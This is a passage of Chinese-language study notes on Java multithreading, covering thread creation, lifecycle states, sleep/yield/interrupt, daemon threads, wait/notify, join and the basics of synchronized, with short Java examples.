<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++) System.out.println(i+<span class="string">&quot;听音乐&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Music m=<span class="keyword">new</span> Music();</span><br><span class="line">m.start();</span><br></pre></td></tr></table></figure>

<h5 id="1-2-实现Runnable-接口"><a href="#1-2-实现Runnable-接口" class="headerlink" title="1.2 实现Runnable 接口"></a>1.2 实现Runnable 接口</h5><blockquote>
<p><strong>作为任务对象</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread(Runnable target，name)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music1</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++) System.out.println(i+<span class="string">&quot;听音乐&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Music1 m1=<span class="keyword">new</span> Music1();</span><br><span class="line">Thread t_music=<span class="keyword">new</span> Thread(m1,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">t_music.start();</span><br></pre></td></tr></table></figure>

<h5 id="1-3-Callable接口"><a href="#1-3-Callable接口" class="headerlink" title="1.3 Callable接口"></a>1.3 Callable接口</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Callable</span>&lt;<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">     <span class="title">V</span> <span class="title">call</span>()</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Callable函数式泛型接口，带有返回值</strong></p>
<ul>
<li><p><code>RunnableFuture&lt;V&gt;</code> 接口继承了<code>Runnable</code>接口和 <code>Future&lt;V&gt;</code>接口，</p>
</li>
<li><p>将<code>FutureTask&lt;V&gt;</code> 的一个实例当做是一个Runnable接口的实例</p>
</li>
<li><p><code>FutureTask</code>能够接收<code>Callable</code>类型的参数，<strong>用来处理结果有返回值的情况</strong></p>
</li>
<li><p>传入Thread来启动我们新建的线程</p>
</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/20180730145740512" alt="img" style="zoom: 80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FutureTask&lt;Integer&gt; future=<span class="keyword">new</span> FutureTask&lt;Integer&gt;(<span class="keyword">new</span> Callable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(future,<span class="string">&quot;这是FutureTask线程&quot;</span>).start();</span><br><span class="line">Integer integer = future.get();</span><br><span class="line">System.out.println(integer);</span><br></pre></td></tr></table></figure>

<h5 id="1-4-匿名创建"><a href="#1-4-匿名创建" class="headerlink" title="1.4 匿名创建"></a>1.4 匿名创建</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread()&#123; </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++) System.out.println(i+<span class="string">&quot;听音乐&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.start();</span><br></pre></td></tr></table></figure>

<p>或者，匿名实现runnable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread.currentThread().setName(<span class="string">&quot;听歌线程&quot;</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;-----&gt;听歌&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">t2.start();</span><br></pre></td></tr></table></figure>

<p>Lambda简化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t2=<span class="keyword">new</span> Thread(  ()-&gt;&#123;</span><br><span class="line"> 	System.out.println(Thread.currentThread().getName()+<span class="string">&quot;-----&gt;听歌&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="实现接口-VS-继承-Thread"><a href="#实现接口-VS-继承-Thread" class="headerlink" title="实现接口 VS 继承 Thread"></a>实现接口 VS 继承 Thread</h5><p>实现接口会更好一些，因为：</p>
<ul>
<li>Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口；</li>
<li>类可能只要求可执行就行，继承整个 Thread 类开销过大。</li>
</ul>
<blockquote>
<p>工具类<code>Executors</code>可以实现<code>Runnable</code>对象和<code>Callable</code>对象之间的相互转换。（<code>Executors.callable（Runnable task）</code>或<code>Executors.callable（Runnable task，Object result）</code>）。</p>
</blockquote>
<h4 id="2、-线程运行原理"><a href="#2、-线程运行原理" class="headerlink" title="2、*线程运行原理"></a>2、*线程运行原理</h4><h5 id="2-1-栈与栈帧"><a href="#2-1-栈与栈帧" class="headerlink" title="2.1 栈与栈帧"></a>2.1 栈与栈帧</h5><blockquote>
<p>JVM中有栈、堆、方法区组成</p>
<p>线程使用栈内存，每个线程启动后，虚拟机为其分配一块栈内存(后进先出)</p>
</blockquote>
<ul>
<li>每一个栈由多个栈帧组成，对应每次方法调用时所占用的内存</li>
<li>每个线程只能有一个活动栈帧，对应正在执行的那个方法</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201001214757147.png" alt="image-20201001214757147" style="zoom: 67%;" />

<h5 id="2-2-线程上下文切换"><a href="#2-2-线程上下文切换" class="headerlink" title="2.2 线程上下文切换"></a>2.2 线程上下文切换</h5><blockquote>
<p>由于一些原因CPU不再执行当前的线程，转而执行另一个线程的代码</p>
</blockquote>
<ul>
<li>线程的CPU时间片用完</li>
<li>垃圾回收</li>
<li>有更高优先级的线程需要运行</li>
<li>主动： 线程自己调用sleep/yield/wait/join/park/synchronized/lock等方法</li>
</ul>
<blockquote>
<p>当Context Switch发生时，需要由<strong>操作系统保存当前线程的状态，并恢复另一个线程的状态</strong></p>
<p>程序计数器，作用是记住下一条jvm指令的执行地址，是线程私有的</p>
</blockquote>
<ul>
<li>状态包括程序计数器、虚拟机栈每个栈帧的信息，如局部变量、操作数栈、返回地址等</li>
<li>频繁的上下文切换会影响性能</li>
</ul>
<h4 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h4><h5 id="3-1-操作系统层面"><a href="#3-1-操作系统层面" class="headerlink" title="3.1 操作系统层面"></a>3.1 操作系统层面</h5><blockquote>
<p>在操作系统层面上</p>
</blockquote>
<ul>
<li><p>新建new：<code>还未与操作系统线程关联</code></p>
</li>
<li><p>就绪Runnable: start（）<code>关联</code></p>
</li>
<li><p>运行running：由任务调度器分配CPU资源，获取CPU资源，执行run()  —&gt;阻塞、死亡、就绪</p>
</li>
<li><p>阻塞block：失去所占用的资源</p>
<ul>
<li>等待阻塞：wait() </li>
<li>同步阻塞：获取synchronized同步锁失败 </li>
<li>其他阻塞： sleep() 发出I/O请求</li>
</ul>
</li>
<li><p>死亡 dead: 终止</p>
</li>
</ul>
<h5 id="3-2-JavaApi层面"><a href="#3-2-JavaApi层面" class="headerlink" title="3.2** JavaApi层面"></a>3.2** JavaApi层面</h5><blockquote>
<p>Java层面六个状态</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201003112044132.png" alt="image-20201003112044132" style="zoom:80%;" />

<ul>
<li><p>new-新建线程对象，还未于操作系统相关联</p>
</li>
<li><p>2-Runnable–&gt;Waiting</p>
<ul>
<li>obj.wait()</li>
<li>obj.notify()/obj.notifyAll()/thread.interrupt()<ul>
<li>竞争锁失败，waiting–&gt;blocked</li>
<li>竞争锁成功，waiting–&gt;runnable</li>
</ul>
</li>
</ul>
</li>
<li><p>3-Runnable–&gt;waiting</p>
<ul>
<li>调用join方法，<strong>当前线程</strong>进入waiting状态</li>
<li>或调用当前线程interrupt(),<strong>当前线程</strong>进入waiting状态</li>
</ul>
</li>
<li><p>4-Runnable–&gt;waiting</p>
<ul>
<li>LockSupport.park</li>
<li>LockSupport.unpark(目标线程)，waiting–&gt;Runnable</li>
</ul>
</li>
<li><p>5-Runnable–&gt;TimeWaiting</p>
<ul>
<li>wait()</li>
<li>等待超时/notify/notifyAll/interrupt<ul>
<li>竞争锁失败，TimeWaiting–&gt;blocked</li>
<li>竞争锁成功 ,  TimeWaiting–&gt;runnable</li>
</ul>
</li>
</ul>
</li>
<li><p>6-Runnable–&gt;TimeWaiting</p>
<ul>
<li>join(long n)</li>
</ul>
</li>
<li><p>7-Runnable–&gt;TimeWaiting</p>
<ul>
<li>sleep(long n)</li>
</ul>
</li>
<li><p>8-Runnable–&gt;TimeWaiting</p>
<ul>
<li>LockSupport.parkNanos(long nanos)、LockSupport.parkUtil(long mills)</li>
</ul>
</li>
<li><p>9-Runnable–&gt;Blocked</p>
<ul>
<li>获得对象锁时竞争失败</li>
<li>Blocked中EntrySet中的线程竞争成功</li>
</ul>
</li>
<li><p>10-Runnable–&gt;Terminated</p>
<ul>
<li>所有代码运行完毕，进入terminated</li>
</ul>
</li>
</ul>
<h4 id="4、Thread方法"><a href="#4、Thread方法" class="headerlink" title="4、Thread方法"></a>4、Thread方法</h4><h5 id="3-1-start与run"><a href="#3-1-start与run" class="headerlink" title="3.1 start与run"></a>3.1 start与run</h5><blockquote>
<ul>
<li>start() 让线程进入就绪状态(runnable)，当CPU时间片分配到CPU资源才会进行运行(running)状态</li>
<li><code>start()</code>会执行线程的相应准备工作，然后自动去执行<code>run()</code>方法的内容，这时真正的多线程工作</li>
<li>直接执行<code>run()</code>方法，会把<code>run</code>方法当成一个<code>main()</code>线程下的普通方法执行，并不会在某个线程中执行它，所以这并不是多线程工作</li>
</ul>
</blockquote>
<blockquote>
<p><strong>直接调用run() 方法并没有启动新的线程，还是由main线程启动!!!!!!!</strong></p>
</blockquote>
<h5 id="3-2-sleep与yield"><a href="#3-2-sleep与yield" class="headerlink" title="3.2 sleep与yield"></a>3.2 sleep与yield</h5><blockquote>
<p><code>Thread.sleep(millisec)</code>方法会休眠当前正在执行的线程，<code>millisec</code>单位为毫秒。</p>
<p>该方法可能会有两个异常：</p>
<ul>
<li><code>IllegalArgumentException</code>:如果参数为负数</li>
<li><code>InterruptedException</code>:如果任何线程中断了当前线程，就会抛出此异常，此时线程的中断状态将被清除。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>sleep() 放弃CPU时间片，running–&gt;Timed Waiting状态(阻塞状态)</li>
<li>睡眠结束后的线程未必会立刻得到执行，需要等待时间片分配CPU资源</li>
</ul>
<p><code>sleep(long milis)</code></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.sleep(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>yield() 让步，会让当前线程从Running进入Runnable就绪状态，然后<strong>调度其它同优先级的线程</strong></p>
</li>
<li><p>在下一次竞争中，若又获得CPU时间片则依旧继续运行</p>
</li>
<li><p>具体实现<strong>依赖于操作系统的任务调度器</strong></p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.yield()</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong></p>
<blockquote>
<p>在没有利用cpu计算时，不要让while(true)空转浪费cpu，这时可以使用sleep/yield来转权给其他程序</p>
<p><strong>sleep适用于无需锁同步的场景</strong></p>
</blockquote>
<p><strong>与 sleep() 方法的区别</strong>：</p>
<ul>
<li><code>sleep()</code>方法给其他进程运行时不会考虑进程的优先级问题，因此会给低优先级的线程以运行的机会；<code>yield()</code>方法只会给相同优先级或者更高优先级的线程以运行的机会。</li>
<li><code>sleep()</code>方法声明会抛出<code>InterruptedException</code>异常，而<code>yield()</code>方法没有声明任何异常。</li>
<li><code>sleep()</code>方法比<code>yield()</code>方法（跟操作系统CPU调度相关）具有更好的可移植性。</li>
</ul>
<h5 id="3-3-线程优先级"><a href="#3-3-线程优先级" class="headerlink" title="3.3 线程优先级"></a>3.3 线程优先级</h5><blockquote>
<p>setPority(),仅仅只是一个提示，调度器可以忽略它</p>
<p>CPU比较忙，那么优先级高的线程会获得更多的时间片；cpu闲时，优先级几乎没有作用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">t1.setPriority(t1.MIN_PRIORITY);<span class="comment">//1</span></span><br><span class="line">t1.setPriority(t1.NORM_PRIORITY);<span class="comment">//5</span></span><br><span class="line">t1.setPriority(t1.MAX_PRIORITY);<span class="comment">//10</span></span><br></pre></td></tr></table></figure>

<h5 id="3-4-name"><a href="#3-4-name" class="headerlink" title="3.4 name"></a>3.4 name</h5><blockquote>
<p>set Name() 、get Name()</p>
<p>构造方法    Thread(String name)  / Thread(Runnable target, String name)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t1=<span class="keyword">new</span> Thread(<span class="string">&quot;music&quot;</span>)</span><br><span class="line"></span><br><span class="line">t1.setName(<span class="string">&quot;music&quot;</span>);</span><br><span class="line"></span><br><span class="line">Thread.currentThread().setName()</span><br></pre></td></tr></table></figure>

<h5 id="3-5-stop-suspend-resume"><a href="#3-5-stop-suspend-resume" class="headerlink" title="3.5 stop/suspend/resume"></a>3.5 stop/suspend/resume</h5><blockquote>
<p>stop停止/suspend暂停/resume恢复是<code>@deprecated</code>过时方法，在操作同步代码块时,会造成死锁</p>
<p>代替的方法 interrupt/park/unpark</p>
</blockquote>
<h4 id="5、-interrupt"><a href="#5、-interrupt" class="headerlink" title="5、*interrupt"></a>5、*interrupt</h4><p><strong>不可打断模式</strong></p>
<blockquote>
<ul>
<li>interrupt并不是马上停止线程，而是给线程<strong>打一个停止标记</strong>，将线程的中断状态设置为true<ul>
<li>stop()方法也可以停止线程，<strong>线程锁住共享资源</strong>，被杀死后其他线程无法获得共享资源，<strong>其他线程永远无法获得资源</strong></li>
<li>stop停止/suspend暂停/resume恢复是<code>@deprecated</code>过时方法，在操作同步代码块时,会造成死锁</li>
</ul>
</li>
<li><strong>当中断sleep/yield时，会出现InterruptException异常</strong></li>
</ul>
</blockquote>
<p><strong>判断中断</strong></p>
<blockquote>
<ul>
<li>static boolean interrupted()：判断当前线程是否中断，清除中断标志。</li>
<li>boolean isInterrupted()：判断线程是否中断，不清除中断标志。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//判断线程是否中断，不清楚中断标志</span></span><br><span class="line">            <span class="keyword">boolean</span> interrupted = Thread.currentThread().isInterrupted();</span><br><span class="line">            <span class="comment">//清除中断标志</span></span><br><span class="line">            <span class="keyword">boolean</span> interrupted1 = Thread.interrupted();</span><br><span class="line">            <span class="keyword">if</span> (interrupted)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">t1.start();</span><br><span class="line">Thread.sleep(<span class="number">50</span>);</span><br><span class="line"><span class="comment">//中断线程</span></span><br><span class="line">t1.interrupt();</span><br></pre></td></tr></table></figure>



<h4 id="6、守护线程"><a href="#6、守护线程" class="headerlink" title="6、守护线程"></a>6、守护线程</h4><blockquote>
<p><code>setDaemon(boolean on)</code></p>
<p>垃圾回收线程是典型的守护线程</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DaemonThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;<span class="comment">//死循环</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i am alive&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">500</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;finally block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">DaemonThread daemonThread = <span class="keyword">new</span> DaemonThread();</span><br><span class="line">daemonThread.setDaemon(<span class="keyword">true</span>); <span class="comment">//建立守护线程，守护main方法</span></span><br><span class="line">daemonThread.start();</span><br><span class="line">Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br></pre></td></tr></table></figure>

<p>线程如果不设置为守护线程，是一个死循环，会一直执行，当我们把它设置为守护线程后，在主线程执行完成后，守护线程也会退出，但是需要注意的是<strong>守护线程在退出的时候并不会执行finnaly块中的代码，所以将释放资源等操作不要放在finnaly块中执行，这种操作是不安全的</strong>。</p>
<h4 id="7、wait-notify"><a href="#7、wait-notify" class="headerlink" title="7、wait/notify"></a>7、wait/notify</h4><blockquote>
<p><strong>必须获得锁状态下才能使用wait/notify</strong></p>
<p>​    wait(long timeout)：将线程放弃同步锁转换为阻塞状态，直到被其他进程进入该同步锁唤醒为止。</p>
<p>​        -带参wait,会在时限结束后直接进入BLOCKING状态</p>
<p>​    notify():<strong>随机唤醒</strong>一个此同步锁上等待的线程</p>
<p>​    notifyAll():唤醒此同步锁上所有等待中的线程。</p>
</blockquote>
<p><strong>存在的问题</strong></p>
<blockquote>
<p>notify会虚假唤醒问题</p>
<ul>
<li>用notifyAll解决</li>
<li>使用while循环解决</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">1</span>)&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;春&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;眠&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;不&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;觉&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;晓&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        flag=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">this</span>.notifyAll();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.wait();</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>(flag==<span class="number">2</span>)&#123;</span><br><span class="line">         System.out.print(<span class="string">&quot;砺&quot;</span>);</span><br><span class="line">         System.out.print(<span class="string">&quot;峰&quot;</span>);</span><br><span class="line">         System.out.print(<span class="string">&quot;科&quot;</span>);</span><br><span class="line">         System.out.print(<span class="string">&quot;技&quot;</span>);</span><br><span class="line">         System.out.print(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">         flag=<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">this</span>.notifyAll();</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     	<span class="keyword">this</span>.wait();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="7-1-wait和sleep区别和共同点"><a href="#7-1-wait和sleep区别和共同点" class="headerlink" title="7.1 wait和sleep区别和共同点"></a>7.1 wait和sleep区别和共同点</h5><ul>
<li><p>俩者都可用于暂停线程的执行</p>
</li>
<li><p>wait()是<strong>Object</strong>实例方法，sleep()是<strong>Thread</strong>的静态方法</p>
</li>
<li><p>wait()方法必须要在同步方法或者同步代码块中<strong>调用</strong>，也就是必须已经获得对象锁，sleep()方法没有这个限制</p>
<ul>
<li>wait()方法会<strong>释放</strong>占有的对象锁，使得该线程<strong>进入等待池waitSet中</strong>，等待下一次获取资源。</li>
<li>而sleep()方法只是会<strong>让出CPU并不会释放掉对象锁</strong></li>
</ul>
</li>
<li><p>sleep()方法在休眠时间达到后如果再次获得CPU时间片就会<strong>继续执行</strong>，而wait()方法必须等待</p>
<ul>
<li>Object.notift/Object.notifyAll通知后，才会离开等待池，并且再次获得CPU时间片才会继续执行</li>
</ul>
</li>
</ul>
<h5 id="7-2-原理"><a href="#7-2-原理" class="headerlink" title="7.2 原理"></a>7.2 原理</h5><blockquote>
<p>实现原理：见3.4monitor</p>
</blockquote>
<h4 id="8、join原理"><a href="#8、join原理" class="headerlink" title="8、join原理"></a>8、join原理</h4><blockquote>
<p><strong>一个线程等待另一个线程的结束</strong>==&gt;保护性暂停==&gt;<strong>线程同步等待问题</strong></p>
<p>插队：当前线程暂停，等待指定的线程执行结束后，当前线程再继续</p>
<p>在一个线程中调用另一个线程的<code>join()</code>方法，会将当前线程挂起，等待另一个线程执行完毕之后再继续往下执行</p>
<p><code>join(long millis)</code></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">t1.join(); <span class="comment">//无参</span></span><br><span class="line">t1.join(<span class="number">1000</span>);<span class="comment">//带参,只等待mills的时间</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">10</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    thread.start();</span><br><span class="line">    thread.join(); <span class="comment">//10，无join0</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="三、共享模型-锁"><a href="#三、共享模型-锁" class="headerlink" title="三、共享模型(锁)"></a>三、共享模型(锁)</h3><h4 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h4><h5 id="1-1-临界区"><a href="#1-1-临界区" class="headerlink" title="1.1 临界区"></a>1.1 临界区</h5><blockquote>
<p>一段代码存在对<strong>共享资源</strong>的<strong>多线程读写</strong>操作，称这段代码为临界区</p>
</blockquote>
<ul>
<li>多线程本身没有问题，也仅仅只是读操作也没用问题</li>
<li>但在多线程对共享资源进行读写操作时，出现<strong>指令交错</strong>时出现问题</li>
</ul>
<h5 id="1-2-竞态条件"><a href="#1-2-竞态条件" class="headerlink" title="1.2 竞态条件"></a>1.2 竞态条件</h5><p>Race Condiction</p>
<blockquote>
<p>在<strong>多线程</strong>下，<strong>没有依赖关系</strong>的代码，在执行<strong>共享变量读写</strong>操作(至少有一个线程写)时，并不能保证以编写顺序执行，这称为发生了竞态条件</p>
</blockquote>
<h5 id="1-3-线程同步"><a href="#1-3-线程同步" class="headerlink" title="1.3 线程同步"></a>1.3 线程同步</h5><blockquote>
<p><strong>线程同步</strong>：当有一个线程对内存进行操作时，其他线程不可以对内存进行，直至该线程结束</p>
</blockquote>
<h5 id="1-4-线程安全"><a href="#1-4-线程安全" class="headerlink" title="1.4 线程安全"></a>1.4 线程安全</h5><blockquote>
<p><strong>上下文切换</strong>造成<strong>指令交错</strong>引发线程安全问题</p>
</blockquote>
<h4 id="2、阻塞式Synchronized"><a href="#2、阻塞式Synchronized" class="headerlink" title="2、阻塞式Synchronized"></a>2、阻塞式Synchronized</h4><blockquote>
<p>避免临界区的竞态条件发生，即保证了线程同步/线程安全</p>
</blockquote>
<h5 id="2-1-Synchronized原理"><a href="#2-1-Synchronized原理" class="headerlink" title="2.1 Synchronized原理"></a><strong>2.1 Synchronized原理</strong></h5><blockquote>
<ul>
<li>Synchronized俗称对象锁，采用<strong>互斥</strong>的方式让同一个时刻至多<strong>只能有一个线程持有同一把对象锁</strong>，其他线程想再获取时会<strong>被阻塞</strong>。</li>
<li>持有锁的线程安全执行临界区的代码，保证了<strong>临界区代码的原子性</strong>，不用担心上下文切换。</li>
<li>Synchronized<strong>锁的是对象</strong>！！！，加在普通方法上锁的是this这个实例对象，加在静态方法上锁的是该类对象</li>
<li>如果有多个线程，<strong>需要对多个线程都加上同一把对象锁</strong>！！！！不然无互斥现象</li>
</ul>
</blockquote>
<blockquote>
<p><strong>保证有序性，但并不能禁止指令重排序</strong></p>
</blockquote>
<p><strong>语法</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(对象)&#123; <span class="comment">//线程1，线程2(blocked)</span></span><br><span class="line">	临界区</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Synchronized保证了多线程三个特性</strong></p>
<blockquote>
<p><strong>synchronized</strong>能够保证任一时刻只有一个线程执行该代码块(线程同步)，并且在释放锁之前会将对变量的修改刷新到主存当中，那么自然就<strong>不存在原子性和可见性</strong>问题了</p>
</blockquote>
<p><strong>关于Synchronized有序性</strong></p>
<blockquote>
<p>由于Synchronized<strong>保证临界区代码不会发生上下文切换</strong>，当变量完全被Synchronized保护，即使临界区代码发生了重排序也无无影响，故<strong>Synchronized能保证作用范围内有序性(但不能禁止重排序)。</strong></p>
</blockquote>
<h5 id="2-2-同步代码块"><a href="#2-2-同步代码块" class="headerlink" title="2.2 同步代码块"></a>2.2 同步代码块</h5><blockquote>
<p>this/.class/其他对象（d？ Demo d=new Demo()）；</p>
<p>但不能使用匿名内部类</p>
</blockquote>
<ul>
<li><p>初始标志位为1，线程访问时标志位设置<strong>为0</strong>，该线程获得访问代码块的权限；</p>
</li>
<li><p>其他线程访问时发现为0则阻塞；执行完毕时设置为1</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (Printer.class)&#123;</span><br><span class="line">		<span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="2-3-同步方法"><a href="#2-3-同步方法" class="headerlink" title="2.3 同步方法"></a>2.3 同步方法</h5><blockquote>
<p>非静态方法锁：this</p>
<p>静态方法锁：.class</p>
</blockquote>
<blockquote>
<p><strong>普通方法锁住的是实例对象</strong>，静态方法是属于类的，<strong>静态方法锁定的是这个类的所有对象</strong></p>
<p>即不管创建多少个实例，都需要等待锁释放</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3、线程安全"><a href="#3、线程安全" class="headerlink" title="3、线程安全"></a>3、线程安全</h4><blockquote>
<p><strong>上下文切换</strong>造成<strong>指令交错</strong>引发线程安全问题</p>
</blockquote>
